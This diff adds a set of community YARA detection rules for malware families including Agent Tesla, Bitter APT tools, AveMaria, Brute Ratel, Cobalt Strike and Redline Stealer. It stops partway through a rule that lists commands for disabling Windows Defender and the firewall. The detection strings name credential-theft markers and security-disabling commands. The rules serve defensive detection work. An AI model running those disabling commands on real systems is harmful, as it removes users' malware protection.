@@ -70972,4 +70972,4701 @@ rule Win64_Ransomware_Wintenzz : tc_detection malicious
             $drop_ransom_note
         )
 }
+/*
+  Yara created from Agent Tesla diff results
+*/
+rule AgentTesla_DIFF_Common_Strings_01
+{
+	meta:
+		date = "2023-09-11"
+		yarahub_uuid = "4e0b52b0-18c7-4d19-8df0-3b0618c315ee"
+		yarahub_license = "CC0 1.0"
+		yarahub_rule_matching_tlp = "TLP:WHITE"
+		yarahub_rule_sharing_tlp = "TLP:WHITE"
+		yarahub_reference_md5 = "c90459986070e38fd8260d4430e23dfd"
+		author = "schmidtsz"
+		description = "Identify partial Agent Tesla strings"
+  strings:
+    $0 = "b77a5c561934e089"
+    $1 = {644174747269627574650047656E657261746564436F64654174747269627574650044656275676765724E6F6E55736572436F64654174747269627574650044656275676761626C65417474726962757465}
+    $2 = "PublicKeyToken=b03f5f7f11d50a3aPADPAD"
+    $3 = {61626C6541747472696275746500456469746F7242726F777361626C6541747472696275746500436F6D56697369626C6541747472696275746500417373656D626C795469746C6541747472696275746500}
+    $4 = {353631393334653038392353797374656D2E5265736F75726365732E52756E74696D655265736F7572636553657402000000000000000000000050414450414450B4000000}
+    $5 = "<requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\""
+    $6 = {6365732E546F6F6C732E5374726F6E676C7954797065645265736F757263654275696C6465720831362E302E302E300000}
+    $7 = {353631393334653038392353797374656D2E5265736F75726365732E52756E74696D655265736F7572636553657402000000010000}
+    $8 = {6564436F64654174747269627574650044656275676765724E6F6E55736572436F646541747472696275746500}
+    $9 = {65616441747472696275746500436F6D70696C657247656E6572617465644174747269627574650047}
+    $10 = {63616E6E6F742062652072756E20696E20444F53206D6F64652E0D0D0A2400000000000000504500004C010300}
+    $11 = {63616E6E6F742062652072756E20696E20444F53206D6F64652E0D0D0A240000000000000050450000}
+    $12 = {4C006500670061006C00540072006100640065006D00610072006B0073}
+    $13 = {41007300730065006D0062006C0079002000560065007200730069006F006E}
+    $14 = {63657074696F6E5468726F777301080100}
+    $15 = {65436F6D7061746962696C69747941747472696275746500}
+    $16 = {6541747472696275746500417373656D626C79}
+    $17 = {6164656D61726B41747472696275746500}
+    $18 = "b03f5f7f11d50a3a"
+  condition:
+    all of them
+}import "pe"
+
+rule agenttesla_win_generic
+{
+	meta:
+		author = "_kphi"
+		date = "2022-09-10"
+		yarahub_uuid = "d595c952-21c9-40ec-8d18-ea91cba4f197"
+		yarahub_license = "CC0 1.0"
+		yarahub_rule_matching_tlp = "TLP:WHITE"
+		yarahub_rule_sharing_tlp = "TLP:WHITE"
+		yarahub_reference_md5 = "ffaa02061474361bc88fbdbbe1c0737d"
+
+	strings:
+		$a = "MyApplication.app"
+		$b = "CallByName"
+		
+	condition:
+		uint16(0) == 0x5A4D
+		and pe.version_info["CompanyName"] contains "Microsoft Corporation"
+		and pe.version_info["FileDescription"] contains "SetupCleanupTask"
+		and pe.version_info["ProductName"] contains "SetupCleanupTask"
+		and all of them
+}
+rule android_apk_hook
+      {
+        meta:
+          date = "2023-04-12"
+          yarahub_reference_md5 = "bd00ea0d160476fc35403a954714db46"
+          yarahub_uuid = "1cf204a2-7d44-4114-8c74-d8987a299626"
+          yarahub_license = "CC BY 4.0"
+          yarahub_rule_matching_tlp = "TLP:WHITE"
+          yarahub_rule_sharing_tlp = "TLP:WHITE"
+          malwaretype = "Hook - https://malpedia.caad.fkie.fraunhofer.de/details/apk.hook"
+          filetype = "apk"
+
+        strings:
+          $aes_key = "1A1zP1eP5QGefi2DMPTfTL5SLmv7Divf"
+          $hook_wa_cmd = "openwhatsapp"
+
+        condition:
+          all of them
+      }
+rule anyburn_iso_with_date {
+    meta:
+        author = "Nils Kuhnert"
+        date = "2022-12-22"
+        description = "Triggers on ISOs created with AnyBurn using volume names such as 12_19_2022."
+        hash1_md5 = "e01931b3aba4437a92578dc802e5c41d"
+        hash1_sha1 = "00799e6150e97f696635718d61f1a4f993994b87"
+        hash1_sha256 = "87d51bb9692823d8176ad97f0e86c1e79d704509b5ce92b23daee7dfb2d96aaa"
+        yarahub_reference_md5 = "e01931b3aba4437a92578dc802e5c41d"
+        yarahub_author_twitter = "@0x3c7"
+        yarahub_uuid = "0f217560-0380-458a-ac9a-d9d3065e22d9"
+        yarahub_license = "CC0 1.0"
+        yarahub_rule_matching_tlp = "TLP:WHITE"
+        yarahub_rule_sharing_tlp = "TLP:WHITE"
+    strings:
+        $volume_name = { 43 44 30 30 31 01 00 00 57 00 69 00 6e 00 33 
+                         00 32 00 20 00 20 00 20 00 20 00 20 00 20 00 20 
+                         00 20 00 20 00 20 00 20 00 3? 00 3? 00 5f 00 3?
+                         00 3? 00 5f 00 3? 00 3? 00 3? 00 3? 00 20 00 20 }
+        $anyburn = "AnyBurn" wide fullword
+    condition:
+        all of them
+}
+rule AppLaunch
+{
+	meta:
+		author = "iam-py-test"
+		description = "Detect files referencing .Net AppLaunch.exe"
+		example_file = "ba85b8a6507b9f4272229af0606356bab42af42f5ee2633f23c5e149c3fb9ca4"
+		new_example_file = "cda99e504a122208862739087cf16b4838e9f051acfcbeb9ec794923b414c018"
+		in_the_wild = true
+		// yarahub data
+		date = "2022-11-17"
+		yarahub_uuid = "613f8ac7-a5f3-4167-bbcd-4dbfd4c8ba67"
+		yarahub_license = "CC0 1.0"
+		yarahub_rule_matching_tlp = "TLP:WHITE"
+		yarahub_rule_sharing_tlp = "TLP:WHITE"
+		yarahub_reference_md5 = "7dbfe0186e52ef2da13079f6d5b800d7"
+	strings:
+		$filelocation = "C:\\Windows\\Microsoft.NET\\Framewor"
+		$applaunch = "\\AppLaunch.exe" nocase
+	condition:
+		$filelocation and $applaunch
+}import "pe"
+import "dotnet"
+
+rule APT_Bitter_Almond_RAT {
+    
+    meta:
+        description = "Detects Bitter (T-APT-17) Almond RAT (.NET)"
+        author = "SECUINFRA Falcon Team (@SI_FalconTeam)"
+        tlp = "WHITE"
+        yarahub_uuid = "5f969f39-809d-43a5-9385-83af01b66707"
+        yarahub_reference_md5 = "71e1cfb5e5a515cea2c3537b78325abf"
+        yarahub_license = "CC BY 4.0"
+        yarahub_rule_matching_tlp = "TLP:WHITE"
+        yarahub_rule_sharing_tlp = "TLP:WHITE"
+        yarahub_author_twitter = "@SI_FalconTeam"
+        reference = " https://www.secuinfra.com/en/techtalk/whatever-floats-your-boat-bitter-apt-continues-to-target-bangladesh"
+        date = "2022-06-01"
+        hash = "55901c2d5489d6ac5a0671971d29a31f4cdfa2e03d56e18c1585d78547a26396"
+
+    strings:
+        $function0 = "GetMacid" ascii
+        $function1 = "StartCommWithServer" ascii
+        $function2 = "sendingSysInfo" ascii
+
+        $dbg0 = "*|END|*" wide
+        $dbg1 = "FILE>" wide
+        $dbg2 = "[Command Executed Successfully]" wide
+
+    condition:
+        uint16(0) == 0x5a4d
+        and dotnet.version == "v4.0.30319"
+        and filesize > 12KB // Size on Disk/1.5
+        and filesize < 68KB // Size of Image*1.5
+        and any of ($function*)
+        and any of ($dbg*)
+}rule APT_Bitter_Maldoc_Verify {
+    
+    meta:
+        description = "Detects Bitter (T-APT-17) shellcode in oleObject (CVE-2018-0798)"
+        author = "SECUINFRA Falcon Team (@SI_FalconTeam)"
+        tlp = "WHITE"
+        yarahub_uuid = "d3bcf5e4-4d6c-48d1-89b1-31fc130ec65a"
+        yarahub_reference_md5 = "a1d9e1dccfbba118d52f95ec6cc7c943"
+        yarahub_license = "CC BY 4.0"
+        yarahub_rule_matching_tlp = "TLP:WHITE"
+        yarahub_rule_sharing_tlp = "TLP:WHITE"
+        yarahub_author_twitter = "@SI_FalconTeam"
+        reference = "https://www.secuinfra.com/en/techtalk/whatever-floats-your-boat-bitter-apt-continues-to-target-bangladesh"
+        date = "2022-06-01"
+        hash0 = "0c7158f9fc2093caf5ea1e34d8b8fffce0780ffd25191fac9c9b52c3208bc450"
+        hash1 = "bd0d25194634b2c74188cfa3be6668590e564e6fe26a6fe3335f95cbc943ce1d"
+        hash2 = "3992d5a725126952f61b27d43bd4e03afa5fa4a694dca7cf8bbf555448795cd6"
+
+    strings:
+        // This rule is meant to be used for verification of a Bitter Maldoc
+        // rather than a hunting rule since the oleObject it is matching is
+        // compressed in the doc zip
+        
+        $xor_string0 = "LoadLibraryA" xor
+        $xor_string1 = "urlmon.dll" xor
+        $xor_string2 = "Shell32.dll" xor
+        $xor_string3 = "ShellExecuteA" xor
+        $xor_string4 = "MoveFileA" xor    
+        $xor_string5 = "CreateDirectoryA" xor
+        $xor_string6 = "C:\\Windows\\explorer" xor
+        $padding = {000001128341000001128341000001128342000001128342}
+    
+    condition:
+        3 of ($xor_string*)
+        and $padding
+}rule APT_Bitter_PDB_Paths {
+    
+    meta:
+        description = "Detects Bitter (T-APT-17) PDB Paths"
+        author = "SECUINFRA Falcon Team (@SI_FalconTeam)"
+        tlp = "WHITE"
+        yarahub_uuid = "1f78e5ba-4c6c-4f14-9f43-78936d0ab687"
+        yarahub_reference_md5 = "71e1cfb5e5a515cea2c3537b78325abf"
+        yarahub_license = "CC BY 4.0"
+        yarahub_rule_matching_tlp = "TLP:WHITE"
+        yarahub_rule_sharing_tlp = "TLP:WHITE"
+        yarahub_author_twitter = "@SI_FalconTeam"
+        reference = "https://www.secuinfra.com/en/techtalk/whatever-floats-your-boat-bitter-apt-continues-to-target-bangladesh"
+        date = "2022-06-22"
+        hash0 = "55901c2d5489d6ac5a0671971d29a31f4cdfa2e03d56e18c1585d78547a26396"
+
+    strings:
+        // Almond RAT
+        $pdbPath0 = "C:\\Users\\Window 10 C\\Desktop\\COMPLETED WORK\\" ascii
+        $pdbPath1 = "stdrcl\\stdrcl\\obj\\Release\\stdrcl.pdb"
+
+        // found by Qi Anxin Threat Intellingence Center
+        // reference: https://mp.weixin.qq.com/s/8j_rHA7gdMxY1_X8alj8Zg
+        $pdbPath2 = "g:\\Projects\\cn_stinker_34318\\"
+        $pdbPath3 = "renewedstink\\renewedstink\\obj\\Release\\stimulies.pdb"
+
+    condition:
+        uint16(0) == 0x5a4d
+        and any of ($pdbPath*)
+}rule avemaria_rat_yhub {
+    meta:
+        date = "2022-10-18"
+        yarahub_uuid = "bb7a4c5e-c2dc-46a1-8a82-028e4e1c5570"
+        yarahub_license = "CC0 1.0"
+        yarahub_rule_matching_tlp = "TLP:WHITE"
+        yarahub_rule_sharing_tlp = "TLP:WHITE"
+        yarahub_reference_md5 = "7897feb76a3beab6fe8aa9851a894437"
+        yarahub_author_twitter = "@billyaustintx"
+        author = "Billy Austin"
+        description = "Detects AveMaria RAT a.k.a. WarZone"
+        malpedia_family = "AVE_MARIA"
+
+    strings:
+        $h1 = "find.db" ascii //packed
+        $h2 = "encryptedPassword" ascii
+        $h3 = "encryptedUsername" ascii
+        $h4 = {63 6d 64 2e 65 78 65 20 2f 43 20 70 69 6e 67} // cmd.exe /C ping
+        
+        $u1 = "logins.json" wide
+        $u2 = "usebackq tokens" wide
+        $u3 = "\\rdpwrap.ini" wide //persistence
+        $u4 = "MidgetPorn" wide
+        $u5 = "wmic process call create" wide
+        $u6 = "sqlmap.dll" wide
+        
+    condition:
+        uint16(0) == 0x5a4d and filesize < 1125KB and 3 of ($h*) and 4 of ($u*)
+}rule binaryObfuscation
+{
+  meta:
+    author = 			"Sean Dalnodar"
+    date = 			"2022-05-27"
+    yarahub_uuid = 		"3f562951-b59f-4b27-806e-823e99910cac"
+    yarahub_license =		"CC0 1.0"
+    yarahub_rule_matching_tlp =	"TLP:WHITE"
+    yarahub_rule_sharing_tlp = 	"TLP:WHITE"
+    yarahub_reference_md5 =	"9c817fe677e2505306455d42d081252c"
+
+  strings:
+    $re0 = /=\([0-1,]{512}/
+
+  condition:
+    all of them
+}rule bruteratelc4 {
+    meta:
+        author = "spyw4re"
+        description = "A Rule to detect brute ratel stager payloads."
+        yarahub_author_twitter = "@CryptDeriveKey"
+        date = "2023-10-06"
+        yarahub_uuid = "950ced7c-f32b-4e02-a343-e2ee18b865ea"
+        yarahub_reference_md5 = "2aef21ef6759026b3008e5a9a1cff67f"
+        yarahub_license = "CC0 1.0"
+        yarahub_rule_matching_tlp = "TLP:WHITE"
+        yarahub_rule_sharing_tlp = "TLP:WHITE"
+        malpedia_family = "win.brute_ratel_c4"
+
+    strings:
+        $api_hashing = {ac 84 c0 74 07 c1 cf 0d 01 c7 eb f4}
+        $push_stack = {50 68 ?? ?? ?? ??}
+    
+    condition:
+        (uint16(0) == 0x5A4D) and all of them
+}  
+
+rule BruteRatelConfig
+{
+    meta: 
+        author = "@immersivelabs"
+        date = "2022-07-07"
+        yarahub_uuid = "8d659456-b774-46db-a36d-6dea912e5e43"
+        yarahub_license = "CC BY 4.0"
+        yarahub_rule_matching_tlp = "TLP:WHITE"
+        yarahub_rule_sharing_tlp = "TLP:WHITE"
+        yarahub_reference_md5 = "6c044bddd01118d311681a9b2d1dd627"
+    strings:
+        $config_block = { 50 48 b8 [8] 50 68}
+        $split_marker = { 50 48 b8 [8] 50 48 b8 }
+
+    condition:
+        filesize < 400KB and $config_block and #split_marker > 30
+}
+import "pe"
+
+rule bumblebee_win_generic
+{
+	meta:
+		author = "_kphi"
+		date = "2022-09-13"
+		yarahub_uuid = "2644a2db-481d-4efb-94b4-309a4e73bccc"
+		yarahub_license = "CC0 1.0"
+		yarahub_rule_matching_tlp = "TLP:WHITE"
+		yarahub_rule_sharing_tlp = "TLP:WHITE"
+		yarahub_reference_md5 = "29a405557da7bb24b2f278c5c46dfd3c"
+
+	strings:
+		$a1 = "FindFirstFile"
+		$a2 = "FindNextFile"
+		$a3 = "HeapWalk"
+		$a4 = "GetCurrentProcessId"
+		$a5 = "GetCurrentThreadId"
+		$a6 = "MapViewOfFile"
+		$a7 = "SwitchToFiber"
+		$a8 = "DeleteFiber"
+		$a9 = "RtlLookupFunctionEntry"
+		$a10 = "TerminateProcess"
+		$a11 = "GetModuleHandleEx"
+		$a12 = "FindFirstFileEx"
+		$a13 = "GetEnvironmentStrings"
+		$a14 = "WriteFile"
+		$a15 = "RaiseException"
+		
+	condition:
+		uint16(0) == 0x5A4D
+		and pe.exports("DllRegisterServer")
+		and 12 of them
+}
+/*
+  Yara created from Chinese nc.exe strings
+*/
+rule Chinese_APT_Backdoor
+{
+	meta: 
+		date = "2023-09-11"
+		yarahub_uuid = "b11b03a5-e30b-4587-bd53-77f5202dae09"
+		yarahub_license = "CC0 1.0"
+        yarahub_rule_matching_tlp = "TLP:WHITE"
+        yarahub_rule_sharing_tlp = "TLP:WHITE"
+        yarahub_reference_md5 = "c90459986070e38fd8260d4430e23dfd"
+		author = "schmidtsz"
+		description = "Identify Chinese APT Backdoor"
+		
+  strings:
+    $0 = "_getportpoop"
+    $1 = "_portpoop"
+    $2 = "_gethostpoop"
+    $3 = "_ding2"
+	$4 = "_ding1"
+	$5 = "_o_alla"
+	$6 = "_holler"
+	
+  condition:
+	all of them
+}/*
+YARA Rule Set
+Author: The DFIR Report
+Date: 2021-02-22
+Identifier: Bazar Drops the Anchor
+Reference: https://thedfirreport.com/2021/03/08/bazar-drops-the-anchor/
+*/
+
+/* Rule Set ----------------------------------------------------------------- */
+
+import "pe"
+
+rule cobalt_strike_tmp01925d3f {
+	meta:
+      description = "files - file ~tmp01925d3f.exe"
+      author = "The DFIR Report"
+      reference = "https://thedfirreport.com"
+      date = "2021-02-22"
+      yarahub_reference_md5 = "1c6ba04dc9808084846ac1005deb9c85"
+      yarahub_uuid = "58ae3b15-154e-47e9-a24c-c8b885a4cd55"
+      yarahub_license = "CC0 1.0"
+      yarahub_rule_matching_tlp = "TLP:WHITE"
+      yarahub_rule_sharing_tlp = "TLP:WHITE"
+      hash1 = "10ff83629d727df428af1f57c524e1eaddeefd608c5a317a5bfc13e2df87fb63"
+      score = 80
+	strings:
+      $x1 = "C:\\Users\\hillary\\source\\repos\\gromyko\\Release\\gromyko.pdb" fullword ascii
+      $x2 = "api-ms-win-core-synch-l1-2-0.dll" fullword wide /* reversed goodware string 'lld.0-2-1l-hcnys-eroc-niw-sm-ipa' */
+      $s3 = "gromyko32.dll" fullword ascii
+      $s4 = "<requestedExecutionLevel level='asInvoker' uiAccess='false'/>" fullword ascii
+      $s5 = "AppPolicyGetProcessTerminationMethod" fullword ascii
+      $s6 = "https://sectigo.com/CPS0" fullword ascii
+      $s7 = "2http://crl.comodoca.com/AAACertificateServices.crl04" fullword ascii
+      $s8 = "?http://crl.usertrust.com/USERTrustRSACertificationAuthority.crl0v" fullword ascii
+      $s9 = "3http://crt.usertrust.com/USERTrustRSAAddTrustCA.crt0%" fullword ascii
+      $s10 = "http://ocsp.sectigo.com0" fullword ascii
+      $s11 = "2http://crl.sectigo.com/SectigoRSACodeSigningCA.crl0s" fullword ascii
+      $s12 = "2http://crt.sectigo.com/SectigoRSACodeSigningCA.crt0#" fullword ascii
+      $s13 = "http://www.digicert.com/CPS0" fullword ascii
+      $s14 = "AppPolicyGetThreadInitializationType" fullword ascii
+      $s15 = "alerajner@aol.com0" fullword ascii
+      $s16 = "gromyko.inf" fullword ascii
+      $s17 = "operator<=>" fullword ascii
+      $s18 = "operator co_await" fullword ascii
+      $s19 = "gromyko" fullword ascii
+      $s20 = "api-ms-win-appmodel-runtime-l1-1-2" fullword wide
+	condition:
+      uint16(0) == 0x5a4d and filesize < 1000KB and
+      ( pe.imphash() == "1b1b73382580c4be6fa24e8297e1849d" or ( 1 of ($x*) or 4 of them ) )
+}rule crashedtech_loader {
+    meta:
+        author = "@luc4m"
+        date = "2023-03-26"
+        hash_md5 = "53f9c2f2f1a755fc04130fd5e9fcaff4"
+        link = "https://medium.com/@lcam/updates-from-the-maas-new-threats-delivered-through-nullmixer-d45defc260d1"
+        tlp = "WHITE"
+
+	yarahub_uuid = "6bcec71c-e550-4ff6-b877-3953ef892179"
+        yarahub_license =  "CC0 1.0"
+        yarahub_rule_matching_tlp =  "TLP:WHITE"
+        yarahub_rule_sharing_tlp =  "TLP:WHITE"
+        yarahub_reference_md5="53f9c2f2f1a755fc04130fd5e9fcaff4" 
+
+    strings:
+        $trait_0 = {02 14 7d ?? ?? ?? ?? 02 28 ?? ?? ?? ?? ?? ?? 02 28 ?? ?? ?? ?? ?? 2a}
+        $trait_1 = {?? 02 7b ?? ?? ?? ?? 6f ?? ?? ?? ?? ?? ?? 02 03 28 ?? ?? ?? ?? ?? 2a}
+        $trait_2 = {?? 28 ?? ?? ?? ?? 72 ?? ?? ?? ?? 7e ?? ?? ?? ?? 6f ?? ?? ?? ?? 0a 2b ??}
+        $trait_4 = {?? 73 ?? ?? ?? ?? 02 28 ?? ?? ?? ?? 28 ?? ?? ?? ?? 0a 2b ??}
+        $trait_5 = {06 6f ?? ?? ?? ?? ?? dc ?? de ?? 26 ?? ?? de ?? 2a}
+        $trait_6 = {11 ?? 6f ?? ?? ?? ?? ?? dc 09 6f ?? ?? ?? ?? 16 fe 01 13 ?? 11 ?? 2c ??}
+        $trait_7 = {06 6f ?? ?? ?? ?? ?? dc ?? de ?? 26 ?? ?? de ?? 2a}
+        $trait_8 = {?? 72 ?? ?? ?? ?? 28 ?? ?? ?? ?? 0a 28 ?? ?? ?? ?? 06 6f ?? ?? ?? ?? 0b 2b ??}
+
+        $str_0 = "username" wide
+        $str_1 = "windows" wide
+        $str_2 = "client" wide
+        $str_3 = "ip" wide
+        $str_4 = "api.ipify.org" wide 
+        $str_5 = "(.*)<>(.*)" wide
+
+    condition:
+        5 of ($str_* ) and 3 of ($trait_*)
+}
+
+rule detect_Redline_Stealer {
+     meta:
+        date = "2023-06-06"
+        author ="Varp0s"
+        yarahub_reference_md5     = "554d25724c8f6f53af8721d0ef6b6f42"
+        yarahub_uuid = "671d6f32-8236-46b5-80e3-057192936607"
+        yarahub_license =  "CC0 1.0"
+        yarahub_rule_matching_tlp =  "TLP:WHITE"
+        yarahub_rule_sharing_tlp =  "TLP:WHITE"
+        tlp = "WHITE"
+
+    strings:
+
+        $req0 = {72 75 6E 64 6C 6C 33 32 2E 65 78 65 20 25 73 61} 
+        $req1 = {43 6F 6E 74 72 6F 6C 20 50 61 6E 65 6C 5C 44 65}
+        $req2 = {77 65 78 74 72 61 63 74 2E 70 64 62 00} 
+        $req3 = {49 58 50 25 30 33 64 2E 54 4D 50 00}
+        $req4 = {54 4D 50 34 33 35 31 24 2E 54 4D 50 00}
+        $req5 = {43 6F 6D 6D 61 6E 64 2E 63 6F 6D 20 2F 63 20 25} 
+        $req6 = {55 50 44 46 49 4C 45 25 6C 75 00}
+
+
+              
+    condition:
+        all of them
+}rule detect_Redline_Stealer_V2 {
+     meta:
+        date = "2023-06-06"
+        author ="Varp0s"
+        yarahub_reference_md5     = "554d25724c8f6f53af8921d0ef6b6f42"
+        yarahub_uuid = "e20669f7-da89-41f6-abeb-c3b5a770530e"
+        yarahub_license =  "CC0 1.0"
+        yarahub_rule_matching_tlp =  "TLP:WHITE"
+        yarahub_rule_sharing_tlp =  "TLP:WHITE"
+        tlp = "WHITE"
+    strings:
+
+        $req0 = {41 00 75 00 74 00 68 00 6F 00 72 00 69 00 7A} 
+        $req1 = {6E 00 65 00 74 00 2E 00 74 00 63 00 70 00 3A 00}
+        $req3 = {44 00 65 00 63 00 63 00 69 00 65 00 00 00}
+        $req4 = {61 00 6D 00 6B 00 6D 00 6A 00 6A 00 6D 00 6D 00}
+        $req5 = {31 00 36 00 33 00 2E 00 31 00 32 00 33 00 2E 00}
+        $req6 = {59 00 61 00 6E 00 64 00 65 00 78 00 5C 00 59 00}
+        $req7 = {31 00 2A 00 2E 00 31 00 6C 00 31 00 64 00 31 00}
+
+              
+    condition:
+        3 of them 
+}import "pe"
+
+rule detect_RWS_pe_rule
+{
+	meta:
+		description = "Detects RWX-S signed binaries. This only verifies that the image contains a signature, not that it is valid."
+		author = "Bill Demirkapi"
+        date = "2023-07-21"
+        author ="wonderkun"
+        yarahub_reference_md5     = "3b25a34bb08f4759792c24b121109506"
+        yarahub_uuid = "63596a4a-c95c-474c-b04f-6315e2093567"
+        yarahub_license =  "CC0 1.0"
+        yarahub_rule_matching_tlp =  "TLP:WHITE"
+        yarahub_rule_sharing_tlp =  "TLP:WHITE"
+        tlp = "WHITE"
+
+	condition:
+		for any i in (0..pe.number_of_sections - 1): (
+			(pe.sections[i].characteristics & pe.SECTION_MEM_READ) and
+			(pe.sections[i].characteristics & pe.SECTION_MEM_EXECUTE) and
+			(pe.sections[i].characteristics & pe.SECTION_MEM_WRITE) and
+			(pe.sections[i].characteristics & pe.SECTION_MEM_SHARED) )
+		and pe.number_of_signatures > 0
+}rule Disable_Defender
+{
+	meta:
+		author = "iam-py-test"
+		description = "Detect files disabling or modifying Windows Defender, Windows Firewall, or Microsoft Smartscreen"
+		false_positives = "Files modifying Defender for legitimate purposes, files containing registry keys related to Defender (i.e. diagnostic tools)"
+		// Yarahub data
+		yarahub_uuid = "1fcd3702-cf5b-47b4-919d-6372c5412151"
+		date = "2022-11-19"
+		yarahub_license = "CC0 1.0"
+		yarahub_rule_matching_tlp = "TLP:WHITE"
+		yarahub_rule_sharing_tlp = "TLP:WHITE"
+		yarahub_reference_md5 = "799a7f1507e5e7328081a038987e9a6f"
+		yarahub_author_twitter = "@iam_py_test"
+	strings:
+		// Windows Defender
+		$defender_policies_reg_key = "\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" ascii wide
+		$defender_powershell_pupprotection_Force = "Set-MpPreference -Force -PUAProtection" ascii wide
+		$defender_powershell_pupprotection = "Set-MpPreference -PUAProtection" ascii wide
+		$defender_reg_key = "\\SOFTWARE\\Microsoft\\Windows Defender" ascii wide
+		$defender_disable_autoexclusions_powershell_force = "Set-MpPreference -Force -DisableAutoExclusions" ascii wide
+		$defender_disable_autoexclusions_powershell = "Set-MpPreference -DisableAutoExclusions" ascii wide
+		$defender_disable_MAPS_reporting_force = "Set-MpPreference -Force -MAPSReporting" ascii wide
+		$defender_disable_MAPS_reporting = "Set-MpPreference -MAPSReporting" ascii wide
+		$defender_disable_submit_samples_force = "Set-MpPreference -Force -SubmitSamplesConsent" ascii wide
+		$defender_disable_submit_samples = "Set-MpPreference -SubmitSamplesConsent" ascii wide
+		$defender_disable_realtime_force = "Set-MpPreference -Force -DisableRealtimeMonitoring" ascii wide
+		$defender_disable_realtime = "Set-MpPreference -DisableRealtimeMonitoring" ascii wide
+		$defender_disable_IPS_force = "Set-MpPreference -Force -DisableIntrusionPreventionSystem" ascii wide
+		$defender_disable_IPS = "Set-MpPreference -DisableIntrusionPreventionSystem" ascii wide
+		$defender_wd_filter_driver = "%SystemRoot%\\System32\\drivers\\WdFilter.sys" ascii wide
+		$defender_wdboot_driver = "%SystemRoot%\\System32\\drivers\\WdBoot.sys" ascii wide
+		$defender_wdboot_driver_noenv = "C:\\Windows\\System32\\drivers\\WdBoot.sys" ascii wide
+		$defender_net_stop_windefend = "net stop windefend" nocase ascii wide
+		$defender_net_stop_SecurityHealthService = "net stop SecurityHealthService" nocase ascii wide
+		$defender_powershell_exclusionpath = "Add-MpPreference -ExclusionPath" xor ascii wide
+		$defender_powershell_exclusionpath_base64 = "Add-MpPreference -ExclusionPath" base64
+		$defender_powershell_exclusionext = "Add-MpPreference -ExclusionExtension" ascii wide
+		$defender_powershell_exclusionprocess = "Add-MpPreference -ExclusionProcess" ascii wide
+		$defender_powershell_exclusionip = "Add-MpPreference -ExclusionIpAddress" ascii wide
+		$defender_uilockdown = "Set-MpPreference -UILockdown" ascii wide
+		$defender_uilockdown_force = "Set-MpPreference -Force -UILockdown" ascii wide
+		$defender_securitycenter = "\\SOFTWARE\\Microsoft\\Windows Defender Security Center\\" ascii wide
+		$defender_location = "C:\\Program Files (x86)\\Windows Defender\\" ascii wide
+		$defender_clsid = "{6CED0DAA-4CDE-49C9-BA3A-AE163DC3D7AF}" nocase ascii wide
+		$defender_powershell_checksigsscan = "Set-MpPreference -CheckForSignaturesBeforeRunningScan" ascii wide
+		$defender_powershell_noscanarchive = "Set-MpPreference -DisableArchiveScanning" ascii wide
+		$defender_powershell_nobmon = "Set-MpPreference -DisableBehaviorMonitoring" ascii wide
+		$defender_powershell_noemail = "Set-MpPreference -DisableEmailScanning" ascii wide
+		$defender_powershell_ioav = "Set-MpPreference -DisableIOAVProtection" ascii wide
+		$defender_powershell_privacymode = "Set-MpPreference -DisablePrivacyMode" ascii wide
+		$defender_powershell_sigschday = "Set-MpPreference -SignatureScheduleDay" ascii wide
+		$defender_powershell_noremovescan = "Set-MpPreference -DisableRemovableDriveScanning" ascii wide
+		$defender_powershell_changewindefend = "Set-Service -Name windefend -StartupType " nocase ascii wide
+		$defender_powershell_changesecurityhealth = "Set-Service -Name securityhealthservice -StartupType " nocase ascii wide
+		$defender_protocol_key = "HKEY_CLASSES_ROOT\\windowsdefender" nocase ascii wide
+		$defender_powershell_controlledfolder_replace = "Set-MpPreference -ControlledFolderAccessAllowedApplications" nocase ascii wide
+		$defender_powershell_controlledfolder_replace_force = "Set-MpPreference -Force -ControlledFolderAccessAllowedApplications" nocase ascii wide
+		$defender_powershell_controlledfolder_add = "Add-MpPreference -ControlledFolderAccessAllowedApplications" nocase ascii wide
+		$defender_powershell_controlledfolder_add_force = "Add-MpPreference -Force -ControlledFolderAccessAllowedApplications" nocase ascii wide
+		$defender_powershell_DisableScanningMappedNetworkDrivesForFullScan = "Set-MpPreference -DisableScanningMappedNetworkDrivesForFullScan" nocase ascii wide
+		$defender_powershell_malwareid = "Add-MpPreference -ThreatIDDefaultAction_Ids " nocase ascii wide
+		$defender_Windows_Security_Health_key = "\\SOFTWARE\\Microsoft\\Windows Security Health" nocase ascii wide
+		$defender_service = "\\SYSTEM\\ControlSet001\\Services\\EventLog\\System\\WinDefend" nocase ascii wide
+		$defender_sc_stop = "sc stop WinDefend" nocase ascii wide
+		$defender_sc_delete = "sc delete WinDefend" nocase ascii wide
+		$defender_sc_disable = "sc config WinDefend start= disabled" nocase ascii wide
+		$defender_powershell_uninstall_feature = "Uninstall-WindowsFeature -Name Windows-Defender" nocase ascii wide
+		$defender_service_key_WdNisDrv = "\\System\\CurrentControlSet\\Services\\WdNisDrv" nocase ascii wide
+		$defender_service_key_WdNisSvc = "\\System\\CurrentControlSet\\Services\\WdNisSvc" nocase ascii wide
+		$defender_service_key_WdBoot = "\\System\\CurrentControlSet\\Services\\Wdboot" nocase ascii wide
+		$defender_securityandmaint_key = "\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Security and Maintenance" ascii wide
+		$defender_task_1 = "schtasks /Change /TN \"Microsoft\\Windows\\ExploitGuard\\ExploitGuard MDM policy Refresh\"" ascii wide
+		$defender_task_2 = "schtasks /Change /TN \"Microsoft\\Windows\\Windows Defender\\Windows Defender Cache Maintenance\"" ascii wide
+		$defender_task_3 = "schtasks /Change /TN \"Microsoft\\Windows\\Windows Defender\\Windows Defender Cleanup\"" ascii wide
+		$defender_task_4 = "schtasks /Change /TN \"Microsoft\\Windows\\Windows Defender\\Windows Defender Scheduled Scan\"" ascii wide
+		$defender_task_5 = "schtasks /Change /TN \"Microsoft\\Windows\\Windows Defender\\Windows Defender Verification\"" ascii wide nocase
+		$defender_wmic = "WMIC /Namespace:\\\\root\\Microsoft\\Windows\\Defender" ascii wide nocase
+		$defender_powershell_networkprotection = "Set-MpPreference -EnableNetworkProtection " ascii wide nocase
+		$defender_restore_default = "\\MpCmdRun.exe -RestoreDefaults" ascii wide
+		
+		// Windows firewall
+		$firewall_netsh_disable = "netsh advfirewall set allprofiles state off" ascii wide
+		$firewall_reg_key = "\\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\" ascii wide
